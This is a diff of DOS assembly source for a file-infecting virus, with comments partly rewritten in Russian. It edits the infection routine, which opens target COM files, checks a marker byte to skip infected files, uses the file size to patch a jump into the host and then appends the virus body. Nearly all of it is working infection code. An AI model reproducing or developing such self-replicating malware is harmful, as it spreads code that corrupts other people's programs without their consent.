@@ -48,16 +48,16 @@ file_open:
     int 21h
     mov bx, ax ; дескриптор файла (ax) -> bx
     
-    ; если файл не найден, возврат к оригинальной программе
+    ; в случае ошибки, возврат к оригинальной программе
     jc redirect
     
-    ; moving carret to the start
+    ; перемещение каретки в начало
     mov cx, 0
     mov dx, 0
     mov ax, 4200h
     int 21h
 
-    ; reading first 4 bytes
+    ; чтение первых 4 байт
     mov cx, 4
     lea dx, [bp + leading_bytes]
     mov ah, 3fh
@@ -67,12 +67,8 @@ file_open:
     cmp [bp + leading_bytes[3]], 69h
     jz find_next
 
-    ; moving carret to the end to get original size
-    mov cx, 0
-    mov dx, 0
-    mov ax, 4202h
-    int 21h
-    mov [bp + payload_offset], ax
+    ; рассчитываем смещение заражаемого файла
+    mov ax, word ptr file.fsize
     mov [bp + jmp_length], ax
     sub ax, 4 ; поправка на первые 4 байта этой программы, которые не записываем
     mov [bp + victim_bp], ax
@@ -92,7 +88,6 @@ file_open:
 
     mov ax, [bp + jmp_length] ; jmp offset
     sub ax, 3 ; jmp command size
-    ; add ax, 100h ; com header
     mov [bp + word_buffer], ax
     lea dx, [bp + word_buffer]
     mov cx, 2
@@ -123,15 +118,8 @@ file_open:
     mov ah, 40h
     int 21h
 
-    ; mov [bp + byte_buffer], 08bh ; wtf
-    ; lea dx, [bp + byte_buffer]
-    ; mov cx, 1
-    ; mov ah, 40h
-    ; int 21h
-
     ; writing virus
     lea dx, [bp + code]
-    ; add dx, 1
     mov cx, offset vir_end
     sub cx, offset code
     mov ah, 40h
@@ -204,32 +192,23 @@ procedures:
 data:
 
     leading_bytes db 0b4h, 4ch, 0cdh, 21h
-    
-    ; 13-byte string for filename
-    Str13 struc
-    max db 13
-    len db ?
-    text db 13 dup(?)
-    Str13 ends
 
     ; DTA buffer structure
     DTAFileInfo struc
-    reserved db 21 dup(?)
-    fattr db ?
-    ftime dw ?
-    fdate dw ?
-    fsize dd ?
-    fname db 13 dup(?)
+        freserved db 21 dup(?)
+        fattr db ?
+        ftime dw ?
+        fdate dw ?
+        fsize dd ?
+        fname db 13 dup(?)
     ends
     
-    filename Str13 <>
     file DTAFileInfo <>
 
     dword_buffer dd ?
     word_buffer dw ?
     byte_buffer db ?
     
-    payload_offset dw ?
     victim_bp dw ?
     jmp_length dw ?
     
